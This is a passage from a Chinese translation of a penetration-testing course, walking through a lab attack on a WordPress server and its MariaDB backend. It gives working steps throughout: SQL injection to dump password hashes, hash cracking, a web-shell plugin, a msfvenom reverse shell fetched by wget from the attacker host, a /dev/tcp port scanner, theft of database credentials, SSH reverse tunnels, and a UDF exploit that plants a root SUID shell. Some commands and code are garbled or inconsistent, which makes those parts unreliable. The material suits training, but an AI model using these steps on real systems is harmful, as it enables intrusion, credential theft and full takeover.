+图 618 - wp_users 表中的所有列
+
+与之前的 payload 类似，此也会被放在 Repeater 标签页中的 `wp_sap` cookie 值。
+
+## 查询 wp_users
+
+图 328：查询
+
+我们的查询结果显示了几个列。最感兴趣的是 `user_login` 和 `user_pass`，因为它们可能包含通过 WordPress 实例所需的凭据。接下来，对于用户名，我们需要向 `wp_users` 表发送所有 `user_login` 的 SQL 注入请求。可以通过更新我们的查询来实现：
+
+```javascript
+'1650197890" OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_login,
+FROM wp_users
+```
+
+我们像之前一样重复相同的注入。
+
+| 请求 | 参数 | 头部 | 十六进制 |
+|---|---|---|---|
+| GET | angle=--<script>id=> | Host: localhost<br>Accept: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/88.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/*,*q=0.8<br>Connection: keep-alive<br>Cookie: session_id=1656147980%3D OR 1=1 UNION SELECT | Cache-Control: max-age=0 |
+
+| 响应 | 头部 | HTML | 渲染 |
+|---|---|---|---|
+| angle=--<script> | | | |
+
+```html
+<div id="sidr-close" class="toggle-close">
+  <i class="icon icon-close"></i>
+</div>
+<script type="text/javascript">
+<script src="/wp-content/wp-includes/js/query.min.js?ver=1.11.4"></script>
+<script src="/wp-content/wp-includes/js/jquery/jquery.min.js?ver=1.11.4"></script>
+<script src="/wp-content/wp-includes/js/ui/effect-slide.min.js?ver=1.11.4"></script>
+```
+
+使用 Kali Linux 进行渗透测试 2.0
+
+![](img/f99f528ca9845f4c256ce54e882b1345_762_0.png)
+
+为了实现此操作，我们需要将 `user_login` 替换为 `user_pass`。
+
+```
+"'16501497880") OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_pass,11 FROM wp_users#"
+```
+
+列表 835 - 列出所有密码
+
+![](img/f99f528ca9845f4c256ce54e882b1345_762_1.png)
+
+由于我们的注入，我们能够恢复密码哈希。请注意，末末的响应包含了三个 `\` 字符来转义单引号 `' `。在对 Web 应用进行身份验证之前，我们需要对此哈希进行破解。
+
+### 24.2.2.2 练习
+
+- 1. 使用 `sqlmap` 利用 SQL 注入并提取用户名和密码。
+
+### 24.2.3 破解密码
+
+现在我们有了密码哈希，需要破解它来获取明文密码。我们可以运行传统的暴力破解攻击，这需要很长的时间，希望能找到匹配的项，这可能需要一些时间。相反，我们选择从使用 "rockyou" 字典列表开始，该文件包含在 Kali Linux 中。
+
+> 如果你还没有这样做，可以使用 `gunzip` 解压 `/usr/share/wordlists/rockyou.txt.gz` 来扩展存档。这将把压缩文件替换为纯文本文件。
+
+PWK 2.0 版权 © Offensive Security Ltd. 保留所有权利。763
+
+OFFENSIVE SECURITY
+
+www.offensive-security.com
+
+使用 Kali Linux 进行渗透测试 2.0
+
+在继续之前，让我们为容器创建一个密码。
+
+```
+kali@kali:$- echo "$PShBfDI66MsPQgmvVsUzwcCsvX9L6I" > pass.txt
+```
+
+871 - 将密码添加到文件中
+
+让我们尝试使用 John the Ripper 破解密码。我们将使用 `-wordlist` 选项指向字典列表路径，并恢复包含密码的文件。
+
+```
+kali@kali:-/Desktop/sandbox.local$ john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
+!love29jan2006! (!)
+1g 00:02:59 0.000724 10391p/10391c/10391C/10391C..lovegod..lov3h
+Use --show --format=phpass 来可靠地显示所有破解的密码
+Session completed
+```
+
+872 - 运行 John the Ripper
+
+运行命令可能需要很长时间，取决于电脑的 CPU。根据列表 872 中的输出，注意密码是 "love29jan2006!"。让我们尝试看看是否可以登录 Web 应用。
+
+默认情况下，WordPress 登录页面位于 `/wp-admin`。访问此页面会提示我们输入用户名和密码。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_763_0.png)
+
+图 331：以管理员用户身份登录
+
+PWK 2.0 版权 © Offensive Security Ltd. 保留所有权利。764
+
+使用 Kali Linux 进行渗透测试 2.0
+
+OFFENSIVE SECURITY
+
+www.offensive-security.com
+
+一旦点击“登录”（Login），我们就进入了管理员仪表板。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_764_0.png)
+
+图 332：登录成功
+
+你可能会收到验证电子邮件地址的请求。如果是这样，你只需点击“此电子邮件是正确的”（This email is correct）即可继续。
+
+现在我们已经登录，可以继续我们的枚举之旅，以发现应该如何利用。
+
+### 24.2.4 枚举管理界面
+
+登录管理界面开启了进一步利用的大门。在开始探索提升权限的方法之前，让我们调查 WordPress 提供的选项。
+
+PWK 2.0 版权 © Offensive Security Ltd. 保留所有权利。765
+
+OFFENSIVE SECURITY
+
+使用 Kali Linux 进行渗透测试 2.0
+
+WordPress 中的一个良好起点是“工具”（Tools）>“站点健康”（Site Health）下的“信息”（Info）。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_765.png)
+
+下面的选项与服务器设置有关。如果需要更改，可能需要 Web 主机的帮助。
+
+在此页面上，我们可以检测到服务器运行着版本为 7.0.33-Ubuntu16.04.7 WordPress。我们还发现数据库运行在 IP 地址 10.5.5.11，这与我们目前的目标不同。这是因为数据库托管在单独的服务器上。
+
+现在我们已经收集了一些信息，可以继续枚举。WordPress 的一个方便之处是我们并没有很多限制。
+
+# 攻击性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+图 879 显示了创建 zip文件的过程。
+
+```
+kali@kali:~$ cd /usr/share/seclists/Web-Shells/WordPress
+kali@kali:~/usr/share/seclists/Web-Shells/WordPress sudo zip plugin-shell.zip plugin-shell.php
+adding: plugin-shell.php (deflated 58%)
+```
+
+879 - 为 web shell 创建 zip 包
+
+生成的文件名为 `plugin-shell.zip`，它将被放置在服务器 `wp-content/plugins` 下的 `plugin-shell` 文件夹中。
+
+现在插件包已经生成，是时候上传 shell 了。首先，我们需要通过点击左侧边栏访问“插件”页面。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_768_0.png)
+
+接下来，我们通过点击*添加插件*来安装插件。这将进入“添加插件”页面。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_769_0.png)
+
+
+
+由于我们不是从 WordPress 目录下载插件，我们需要选择页面左上角的“上传插件”。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_770_0.png)
+
+图 336: 上传插件对话框
+
+这将打开一个区域，我们可以在其中选择插件包。我们需要选择“浏览”，这将打开一个文件对话框让我们找到创建的包。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_771_0.png)
+
+图 337: 选择插件 Zip
+
+在文件对话框打开的情况下，我们导航到包含插件的目录，选择 `plugin-shell.zip` 文件，并点击对话框底部的“打开”。
+
+最后，为了安装插件，我们点击`立即安装`。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_772_0.png)
+
+> 图 338: 安装插件
+
+安装插件将上传 zip 文件并解压内容。
+
+现在插件已安装完成，我们可以尝试使用它在 WordPress 目标上运行 shell 命令。为此，我们仅需使用 `curl`。如前讨论的，插件目录为 `wp-content/plugins/`，zip 将被解压到名为 `plugin-shell` 的目录中，而我们的目标文件名为 `plugin-shell.php`。
+
+记住我们还必须设置一个 `cmd` 参数，其中包含我们尝试在目标上执行的命令。让我们尝试执行 `whoami` 看看 shell 是否有效。
+
+```
+kali@kali:~$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
+```
+
+> 列表 880 - 运行 whoami
+
+成功了！根据列表 880 的输出，我们正在以 `www-data` 用户身份运行命令。现在是时候上传 meterpreter 负载并获取完整的反向 shell（reverse shell）了。
+
+首先，让我们使用 `msfvenom` 工具生成一个 meterpreter 负载。
+
+```
+kali@kali:~$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=443 -f elf > shell.elf
+```
+
+列表 881 - 生成 meterpreter 负载
+
+我们选择 Linux 反向 TCP 负载，因为从之前的枚举中知道目标运行在 Ubuntu 上。`LHOST` 将指向我们的 Kali IP 地址，我们将 `LPORT` 设置为 443，试图规避任何出站防火墙规则。虽然检查出站过滤是一个良好的习惯，但在这里我们假设 443 端口是不受限制的。我们正在生成 elf 格式的负载，并将输出重定向到 kali 用户主目录中名为 `shell.elf` 的文件中。
+
+生成 meterpreter 反向 shell 后，我们将启动一个服务器允许目标下载该 shell。
+
+```
+kali@kali:~$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 ...
+```
+
+列表 882 - 在端口 80 上启动 web 服务器
+
+列表 882 中的 web 服务器使用 Python 的 `http.server` 模块，被指示使用端口 80，并从 kali 用户的主目录提供文件。我们再次选择了端口 80，以避免在防火墙拦截任意端口时可能遇到的任何问题。
+
+shell 已生成且 web 服务器正在运行，我们将指示目标下载 shell。我们将使用 `wget` 从我们的 Kali 系统下载 shell。然而，我们必须用 `%20` 编码任何字符，因为在 URL 中不能使用空格。列表 883：
+
+```
+kali@kali:~$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://10.11.0.4/shell.elf
+```
+
+列表 883 - 将 shell 下载到目标
+
+如果命令执行成功，我们会在 Kali web 服务器日志中看到类似下面的条目。
+
+```
+Serving HTTP on 0.0.0.0 port 80 "GET /shell.elf HTTP/1.1" 200 - [09/Oct/2019 19:48:16]
+```
+
+列表 884 - 成功下载
+
+成功！我们需要让 shell 具有执行权限，在 Kali 上建立一个 Metasploit 处理器（handler），并在目标上运行该文件以获取 meterpreter shell。为了使 shell 可执行，我们将对其运行 `chmod +x`。我们还需要转义空格（%20）。制作 shell 的命令显示在列表 885 中：
+
+```
+kali@kali:~$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20shell.elf
+```
+
+列表 885 - 使 shell 可执行
+
+此时，shell 应该是可执行的。接下来，我们将在适当接口和端口上启动一个 meterpreter 负载监听器。
+
+```
+kali@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.11.0.4; set LPORT 443; run"
+```
+
+列表 886 - 启动会话
+
+在 `msfconsole` 命令中，我们让 Metasploit 静默启动 (-q)，并通过 `-x` 选项立即配置负载处理器，传递与生成 shell 时相同的相同的负载设置。
+
+有了监听器后，终于是时候获取反向 shell 了。这可以通过通过我们安装的恶意插件执行 `shell.elf` 来。
+
+```
+kali@kali:~$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=shell.elf
+```
+
+列表 887 - 运行 shell
+
+回到我们的监听器，我们看到已经捕获了一个 shell。
+
+```
++[*] Sending stage (985320 bytes) to 10.11.1.250
+[*] Meterpreter session opened (10.11.0.4:443) -> 10.11.1.250:53768) at 19:54:41
+
+meterpreter > shell
+Process 9629 created.
+Channel 1 created.
+
+whoami
+www-data
+
+exit
+meterpreter >
+```
+
+列表 888 - 捕获反向 shell
+
+现在我们已经在 WordPress 机器上拥有了 shell，我们将进入渗透后枚举。
+
+## 24.2.6 渗透后枚举
+
+首先，让我们收集一些关于主机的基本信息，例如网络配置、主机名、操作系统版本等。
+
+```
+meterpreter > shell
+Process 6667 created.
+Channel 3 created.
+
+ifconfig
+ens160 Link encap:Ethernet Hwaddr 00:50:56:8a:82:85
+inet addr:10.11.0.4 Bcast:10.11.0.255 Mask:255.255.255.0
+inet6 addr:fe80::256:ff:fe8a:6284 Scope:link
+UP BROAD RUNNING MULTICAST MTU:1500 Metric:1
+
+RX packets:29154 errors:0 dropped:22 overflows:0 frame:0
+TX packets:176526 errors:0 dropped:0 overheads:0 carrier:0
+collisions:0 txqueued:1000
+RX bytes:8327519 (8.3 MB) TX bytes:13590061 (13.5 MB)
+
+hostname
+ajla
+
+```
+
+```
+cat /etc/issue
+
+Ubuntu 16.04 LTS
+
+```
+
+```
+cat /proc/version
+
+Linux version 4.4.0-21-generic (gcc version 5.3.1 20160413 (Ubuntu 5.4.0)-3.1-14ubuntu2)
+```
+
+
+
+## 列表 889 - 收集基本信息
+
+通过这些基本信息收集，我们了解到主机名为“Ajla”，IP 地址为 `10.4.4.10`，Linux 版本为 Ubuntu `16.04.12`，内核为 `4.4.0-21-generic`。这些信息将允许我们开始绘制网络地图，并在以后可能很有用。
+
+# 攻击性安全
+
+`-rw-r--r-- 1 www-data-data 2.9K Jan 7 2019 wp-config-sample.php`
+`-rw-r--r-- 1 www-data-data 2.7K Dec 6 18:07 wp-config.php`
+`drwxxr-x 6 www-data-data 4.0K Dec 9 19:04 wp-content`
+
+```bash
+cat wp-config.php
+// My MySQL settings - You get this info from your web host //
+define('DB_NAME', 'wordpress');
+/* MySQL database username */
+define('DB_USER', 'wp');
+/* MySQL database password */
+define('DB_PASSWORD', 'Lv9EVq86cf8iWsqFQuYu');
+/* MySQL hostname */
+define('DB_HOST', '10.5.5.11');
+```
+
+## 列表 890 - 读取 wp-config.php
+
+在 `wp-config` 文件中，我们发现数据库的 IP 地址为 `10.5.5.11`。我们还发现了 MariaDB 用户名为 `'wp'`，该账户的密码为 `'Lv9EVq86cf8iWsqFQuYu'`。为了继续，我们需要修改进入网络的据点并创建一个稳定的跳板点。
+
+## 24.2.7 创建一个稳定的跳板点
+
+在继续之前，让我们回顾一下我们拥有的东西。我们拥有以 `www-data` 用户身份在 WordPress 机器上的 shell，并且可以通过 Ajla 访问数据库的网络。最后，我们发现了有效的数据库凭据，因为它们已经在 WordPress 应用程序中使用。
+
+到目前为止，网络结构应该类似于图 340 所示。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_776_0.png)
+
+图 340：数据库主机名未知的网络图
+
+由于 WordPress 机器和数据库位于不同的网络上，现在是使用隧的绝佳机会。由于我们的反向 shell 运行在没有有效登录 shell 的非特权用户账户（`www-data`）环境中，我们的选择非常有限。
+
+由于 `ssh` 是每个 Linux 发行版都包含的核心应用程序，我们可以尝试创建一个反向隧道。一个限制是，我们没有 root 权限为 `www-data` 用户创建登录，我们需要使用 WordPress 机器上的 SSH 客户端登录到我们的 Kali 服务器来创建隧道。简而言之，我们需要一个反向隧道。
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+使用隧道进行动态端口转发是没用的，那是错误的方法。本地端口转发也没有用。远程端口转发允许我们在 Kali 中打开一个指向 MariaDB 服务器的端口。这要求我们知道内部目标上实际上哪些端口是开放的。
+
+首先，我们将检查是否有 `Nmap`，看看是否可以更容易端口扫描，但我们不应该抱太大期望。
+
+```bash
+nmap
+/bin/sh: 1: nmap: not found
+```
+
+## 列表 891 - 检查 Nmap
+
+如预料的那样，服务器上没有 `Nmap`，但不用担心。我们可以创建一个快速脚本来扫描主机。
+
+```bash
+#!/bin/bash
+host=10.5.5.11
+for port in {1..65535}; do
+  timeout 1 bash -c "echo >/dev/tcp/$host/$port" && \
+  echo "port $port is open"
+done
+echo "Done"
+```
+
+## 列表 892 - Bash 端口扫描
+
+脚本的内容可以保存存在文件 `portscan.sh` 中。我们的脚本将迭代从 1 到 65535 的每个端口。对于每个端口，将建立一个超时时间为 .1 秒的连接，如果连接成功，脚本将显示哪个端口是开放的。
+
+这个脚本虽然快速且原始，但它能带我们所需的信息。要运行该脚本，我们需要将内容导出到文件中。此的一种快速方法是使用 `meterpreter` 命令。
+
+```meterpreter
+meterpreter > upload /home/kali/portscan.sh -> /tmp/portscan.sh
+[*] uploading : /home/kali/portscan.sh -> /tmp/portscan.sh
+[*] uploaded - 100 B of 151.00 B (-0.66%): /home/kali/portscan.sh -> /tmp/portscan.sh
+[*] uploaded : /home/kali/portscan.sh -> /tmp/portscan.sh
+```
+
+```meterpreter
+meterpreter > shell
+Process 2924 created.
+Channel 2 created.
+```
+
+```bash
+cd ~
+chmod +x portscan.sh
+```
+
+```bash
+./portscan.sh
+port 22 is open
+port 3306 is open
+done
+```
+
+## 列表 893 - 运行 bash 端口扫描
+
+扫描将需要一段时间才能完成，但完成后，我们看到端口 `22` 和 `3306` 是开放的。现在我们需要创建一个通到 Kali 的隧道来访问数据库服务器上的 `22` 和 `3306` 端口。实现此目的的 `ssh` 命令看起来如下：
+
+```bash
+ssh -R 1122:10.5.5.11:3306 -R 1306:10.5.5.11:3306 kali@10.5.5.1
+```
+
+## 列表 894 - ssh 的第一次迭代
+
+在列表 894 中，我们将 Kali 上的端口 `1122` 打开到端口 `22`。接下来，我们还将在 Kali 上打开 `3306` 端口到 MariaDB 主机上的 `3306` 端口。如果在帮助中运行此命令，我们将很快遇到一个障碍，因为我们没有交互式 shell。这是一个问题，因为 `ssh` 将提示我们接受主机并输入 Kali 用户的密码。出于安全考虑，我们希望避免输入密码。我们可以使用两个可选标志来修复第一个问题：`UserHostsFile=/null` 和 `StrictHostChecking=no`。第一个选项防止 `ssh` 尝试通过将输出发送到 `/dev/null` 保存主机。第二个选项将指示 `ssh` 不要接受该主机。这两个选项都可以通过标志设置。更新后的命令看起来如下：
+
+```bash
+ssh -R 1122:10.5.5.11:3306 -R 13306:10.5.5.11:3306 -o UserHostsFile=/dev/null -o StrictHostChecking=no kali@10.5.5.1
+```
+
+## 列表 895 - ssh 的第二次迭代
+
+现在我们需要防止 `ssh` 询问密码，我们可以使用 `ssh` 密钥来实现。我们将为 WordPress 主机生成 `ssh` 密钥，配置 Kali 接受登录（仅限端口转发），并再次修改 `ssh` 命令。
+
+```bash
+mkdir keys
+cd keys
+ssh-keygen
+Generating public/private key pair.
+Enter file to save (/home/www/.ssh/id_rsa): /tmp/keys/id_rsa
+Enter passphrase (empty for no):
+Enter passphrase again (empty for no):
+Identification has been saved in /tmp/keys/id_rsa.
+You have saved your public key in /tmp/keys/id_rsa.
+```
+
+```bash
+cat id_rsa.pub
+AAA-rsa AAAAB3NzaCycEAAA2EAAQABAABAABQ02E7UzQ1XUq804JIQhIIpsXFIIg+P4nK29XkZsmFfhYjH4YH4ur4HfN2HH4D2J4k9F759907a3E2uZECwT2cNNL11F5S7F0RR226a3TYZMI/EN0c8+NHt1Wc2c059RAaRC/Hk77Z1LNo6v6R4aY/BZWkQYaz/C3B8K27555333333BBSS75nN881111/d20=
+```
+
+
+
+```
+列表 896 - ssh 命令的生成
+```
+
+此公钥需要输入 Kali 主的 `authorized_keys` 文件中，但需要一些限制。为了避免安全问题，我们可以收紧配置，仅允许来自 WordPress IP 地址的访问（Kali 看到的是 NAT 而而非主机 IP）。
+
+接下来，我们希望忽略用户提供的任何命令。这可以通过 `ssh` 命令来实现。我们还希望通过 `no-agent-forwarding` 和 `no-X11-forwarding` 防止代理和 X11 转发。最后，我们希望通过 `no-pty` 防止用户分配终端设备。Kali 上的最终 `~/.ssh/authorized_keys` 文件可以在列表 897 查看。
+
+```bash
+from='10.11.1.250', echo 'This account can only be used for port forwarding'
+
+no-agent-forwarding,no-X11-forwarding,no-pty pty-ssh-rsa AAAAB3NzaCycAAA2EAAQABAABAABQ02E7UzQ1XUq804JIQhIIpsXFIIg+P4nK29XkZsmFfhYjH4YH4ur4HfN2HH4D2J4k9F759907a3E2uZECwT2cNNL11F5S7F0RR226a3TYZMI/EN0c8+NHt1Wc2c059RAaRC/Hk77Z1LNo6v6R4aY/BZWkQYaz/C3B8K27555333333BBSS75nN881111/d20=
+```
+
+列表 897 - `authorized_keys` 文件
+
+### 24.3 目标数据库
+
+Web 应用通常将数据库配置在另一台服务器上，沙箱环境也是如此。然而，此时此时我们已经有了对数据库主机的网络访问权限，在大多数情况下，我们可以将其视为处于同一个网络中。与隧道总是出现的情况一样，你应该预期会有一些延迟。
+
+#### 24.3.1 枚举
+
+在数据库枚举的这一阶段，我们知道自己已经掌握了一些信息。由于拥有 WordPress 的权限，我们知道主机与我们当前所在的网络不在同一个网络中。我们还知道正在运行 MariaDB `10.3.2` 版本。快速的 Google 搜索告诉我们，这是一个相当新的版本。这带来了一个问题，因为新版本很可能没有导致远程代码执行的漏洞。
+
+让我们连接到数据库并开始枚举 MariaDB 的其他方面。
+
+##### 24.3.1.1 应用程序/服务枚举
+
+要连接 MariaDB，我们可以使用 Kali 的 MySQL 客户端，结合从 WordPress 配置文件中恢复的凭据。虽然 MariaDB 与 MySQL 是不同的包，但它们在设计时考虑了兼容性。我们还需要将 MySQL 客户端指向在 kali 端口 `3306` 上运行的隧道。
+
+```
+kali@kali:~$ mysql --host=127.0.0.1 --port=3306 --user=wp -p
+
+Enter password:
+
+Type 'help'; or 'h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]>
+```
+
+| 列表 901 - 连接到 MariaDB |
+| :--- |
+| `wp@%` 的权限 |
+| `GRANT USAGE ON *, TO 'wp'@'%' IDENTIFIED BY PASSWORD '*G61136AE4E4B131AB0E43F07BE7B7'` |
+| `GRANT SELECT, INSERT, UPDATE, DELETE ON TO 'wp'@%'` |
+| 集合中 2 行 (0.075 秒) |
+
+现在我们已经建立了连接，可以查看作为 `wp` 用户所拥有的权限，并更好地了解此 MariaDB 实例是如何配置的。
+
+```
+MariaDB [(none)] SHOW Grants;
+```
+
+我们没有 `"*"` 权限，但 `SELECT`、`INSERT`、`UPDATE` 和 `DELETE` 是一个很好的起点。接下来，让我们来看一些变量，看看是否能发现任何异常常之处。
+
+```
+MariaDB [(none)] show variables;
+```
+
+> 790 (MariaDB, 2020), https://mariadb.com/kb/en/library/mariadb-vs-mysql-compatibility/
+
+| 变量名 | 值 |
+| :--- | :--- |
+| `alter_algorithm` | DEFAULT |
+| `aria_block_size` | 8192 |
+| `aria_checkpoint_interval` | 30 |
+| `hostname` | zora |
+| `identity` | 0 |
+| `pid_file` | `/run/mysql/mariadb.pid` |
+| `plugin_dir` | `/home/dev/plugin/` |
+| `plugin_maturity` | gamma |
+| `preload_buffer_size` | 3306 |
+| `profiling` | OFF |
+| `tmp_memory_table_size` | 16777216 |
+| `tmp_table_size` | 16777216 |
+| `tmpdir` | `/var/tmp` |
+| `transaction_alloc_block_size` | 8192 |
+| `userstat` | OFF |
+| `version` | 10.3.20-MariaDB |
+| `version_comment` | MariaDB Server |
+| `version_compile_machine` | x86_64 |
+| `version_compile_os` | Linux |
+| `version_malloc_library` | system |
+| `wsrep_sst_receive_address` | AUTO |
+| `wsrep_start_position` | 00000000-0000-0000-0000-000000000000 |
+| `wsrep_sync_wait` | 0 |
+| 集合中 639 行 (0.154 秒) |
+
+列表 903 - 显示所有变量
+
+通过此查询我们学到了几点。首先，我们发现 `hostname` 为 `"zora"`。从现在起，我们将 MariaDB 标记为 Zora。接下来，我们还了解到 `tmp` 目录在 `/var/tmp`。我们还确认了正在运行 MariaDB `10.3.20`，但现在也知道了架构是 `x86_64`。我们能收集的最有趣的信息是 `plugin_dir` 被设置为 `/home/dev/plugin/`。这个目录对于 MariaDB 并不是标准的。我们注意到了，它在之后可能会有用。
+
+现在我们已经有了一些信息，让我们看看是否能为我们的目标 MariaDB 版本找到任何利用程序。
+
+```
+kali@kali:~# search-explploit mariadb
+```
+
+| 漏洞标题 | 路径 (`/usr/share/exploit/`) |
+| :--- | :--- |
+| MariaDB Client 1.0.26 - 拒绝服务 (POC) | `exploits/dos/45901.txt` |
+| MySQL / MariaDB - 几何查询服务 | `exploits/dos/38392.txt` |
+| MySQL / MariaDB - Percona 5.5.5/5.6.3-52.17/4 - Co | `exploits/local/local/40360.txt` |
+| MySQL / MariaDB - Percona 5.5.x/5.6.x/5.7.x - 'mysql' | `exploits/local/local/40678.txt` |
+| MySQL / MariaDB - Percona 5.5.x/5.6.x/5.7.x - 'root' | `exploits/local/local/40679.sh` |
+| MySQL / MariaDB - 不安全盐生成 | `exploits/local/remote/38109.py` |
+
+不幸的是，这些都不适用于我们的 MariaDB 版本。让我们扩大范围，看看 MySQL 有什么结果。
+
+```
+kali@kali:~# search-exploit mysql
+```
+
+
+
+| 漏洞标题 | 路径 (`/usr/share/exploit/`) |
+| :--- | :--- |
+| MySQL (Linux) - 权限提升 | `exploits/local/23087.pl` |
+| MySQL (Linux) - 堆溢出 (PoC) | `exploits/local/23086.pl` |
+| MySQL (Linux) - 栈溢出 (PoC) | `exploits/local/23085.pl` |
+| MySQL 3.0/x - ALTER TABLE Oldis | `exploits/remote/24669.txt` |
+| MySQL 4.0/17 - 用户定义函数 (UDF) | `exploits/local/1183.c` |
+| MySQL 4.1.18/5.0.28 - 信息泄露 | `exploits/remote/1742.c` |
+| MySQL 4.1.5/0.0 - 零长度密码 | `exploits/multiple/25210.pl` |
+| MySQL 4.1.0/5.0 - 认证 | `exploits/multiple/25211.pl` |
+| MySQL 4.X - CREATE FUNCTION 代码 | `exploits/multiple/25249.pl` |
+| MySQL 4.X - CREATE FUNCTION Symlink | `exploits/multiple/25211.c` |
+| MySQL 4.5/5.0 (Linux) - 用户定义函数 (UDF) | `exploits/local/1518.c` |
+| MySQL 4.5/5.0 (Windows) - 用户定义函数 | `exploits/windows/3274.txt` |
+| MySQL 4.5/x/5.0 - 拒绝服务 | `exploits/local/23852.txt` |
+| MySQL UDF 误计算 | `exploits/remote/23890.txt` |
+| MySQL 4.5/6 - UDF 命令注入 | `exploits/local/7856.txt` |
+| MySQL 5 - 命令行特殊字符 | `exploits/remote/32445.txt` |
+| MySQL 5.0.18 - 查询日志绕过 | `exploits/remote/27326.txt` |
+| MySQL Access Request 2.1.4 - HTML 注入 | `exploits/php/webapps/20855.txt` |
+| MySQL Access Request 2.1.4 - SQL 注入 | `exploits/php/webapps/44843.txt` |
+| MySQL User-Defined (Linux) (x32/x86_64) - 'sys_ | `exploits/local/46249.py` |
+| MySQL yaSSL (Linux) - SSL 消息溢出 | `exploits/remote/16849.rb` |
+| MySQL yaSSL (Windows) - SSL Hello 消息溢出 | `exploits/windows/remote/16781.rb` |
+
+| 论文标题 | 路径 (`/usr/share/exploit-papers`) |
+| :--- | :--- |
+| 基于 RFI 的 MySQL 会话劫持 | `docs/english/17308-mysql-session-hijacking-over` |
+| MySQL UDF 利用 | `docs/english/44139-mysql-udf-exploitation.pdf` |
+| MySQL 安全 Web 应用 - SQL 注入 | `papers/english/12945-mysql-secure-web-apps---s` |
+| 领域的创新 - Ho | `docs/english/48143-novel-contributions-to-the-` |
+
+在搜索 MySQL 漏洞时，我们需要改变方法。这次我们没有寻找可能受利用的精确版本号，因为 MariaDB 和 MySQL 使用的版本不同。相反，我们正在尝试从公开的利用程序中识别出可以使用的攻击类型模式。
+
+我们注意到 `UDF` 和 `User Defined` 词经常出现。让我们看看 `/home/dev/plugin/` 中发现的较新的 UDF 利用程序。
+
+# 漏洞标题: MySQL User-Defined (Linux) (x32/x86_64) - sys_exec
+
+# 日期: 24/01
+
+# 参考: https://dev.mysql.com/doc/create-function-udf
+
+利用程序通过引用 UDF 包含开始。UDF 用 C 或 C++ 编写，可以运行我们写的任何代码。然而，我们能够获得一个初始 shell。在开始任何操作之前需要一些修改，让我们来看代码。
+
+```
+shellcode_x32 = "\x7f\x53\x45\x46\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00..."
+
+shellcode_x64 = "\x7f\x53\x45\x46\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00..."
+```
+
+```python
+# (省略 shellcode 赋值部分 ...
+cmd='mysql -u root -p\' + password + \'\' -e select "@plugin_dir G \""
+
+plugin_in = subprocess.check_output(cmd, shell=True)
+
+plugin_dir = re.search("@plugin_dir: (\S+)", plugin_str)
+
+res = os.path.isfile(plugin_dir.group(1))
+```
+
+```python
+# (省略前面的逻辑 ...
+print("正在创建一个 UDF 库...")
+os.system('mysql -u root -p\' + password + \'\' -e select binary 0x\' + shellcode + \'\' into dumpfile \%s\\'G"' % udf_outfile)
+
+res = os.path.isfile(ud_outfile)
+```
+
+```python
+# (省略前面的逻辑 ...
+print("UDF 库创建成功: %s" % udf_outfile)
+```
+
+# 攻击安全
+
+```python
+100 print "'mysql -u root -p' + password + ' -e create function sys_exec retu"
+101 os.system('mysql -u root -p' + password + ' -e create function sys_exec ret')
+102 int name=%s'G' % udf filename
+103 print "Checking if sys_exec was created...")
+104 cmd='mysql -u root -p' + password + ' -e select from mysql.func where name=\'sys_exec\' 'G'
+105 res = subprocess.check_output(cmd, shell=True);
+```
+
+```python
+if res:
+111 print "sys_exec was created a void binary %s in /tmp/sh..."
+112 print "Generating a shell root..."
+113 os.system('mysql -u root -p' + password + ' -e select sys_exec(\'/bin/sh;/tmp/sh; chmod root:/tmp/sh; chmod +s /tmp/sh\')')
+114 print "Tawning a shell root..."
+115 pty.spawn(\'/tmp/sh\');
+```
+
+我们首先注意到的是第 40-45 行定义的 shell 变量。第 71 行的 SQL 查询获取了目录成员（我们发现该变量在 Zora 上不是标准的）。接下来，在第 92 行，代码将 shellcode 二进制转储到插件目录下的文件中。第 101 行利用上传的二进制文件创建了一个名为 `sys_exec` 的函数。最后，脚本在第 104 行检查函数是否成功创建，如果是，则在第 113 行执行该函数。进一步阅读 MySQL `CREATE FUNCTION` 语法$^{72}$ 可以发现，shellcode 变量的内容应该是一个共享库，用于实现并导出我们在数据库中想要创建的函数。
+
+本质上，这个脚本只运行了条命令。我们将代码精简为核心的 MySQL 命令，可以得到以下内容：
+
+```sql
+
+
+
+`select @plugin_dir`
+
+`select binary \0shellcode returns int name udf filename;`
+
+`create function sys_exec returns int name udf filename;`
+
+`select * from mysql.func where name='sys_exec' \`
+
+`select sys_exec('/bin/sh;/tmp/sh; chmod root:/tmp/sh; chmod +s /tmp/sh')`
+
+由于我们有一个交互式的 MariaDB shell，理论上我们可以在进入 Zora 之后直接在 MariaDB shell 中运行这些命令。然而，在继续之前，我们想要确保自己即将执行的内容。
+
+## 24.3.2 尝试利用数据库
+
+虽然单个命令本身没有引起担心，但我们并不知道 shellcode 在做什么。相反，我们将 shellcode 替换为我们能够控制的内容。利用程序中的引用提到使用了 `raptor.udf.c`。快速搜索 Google 发现了相关的：
+
+> 732 (Oracle Corporation, 2020), https://dev.mysql.com/doc/refman/5/en/create-function-udf.html
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
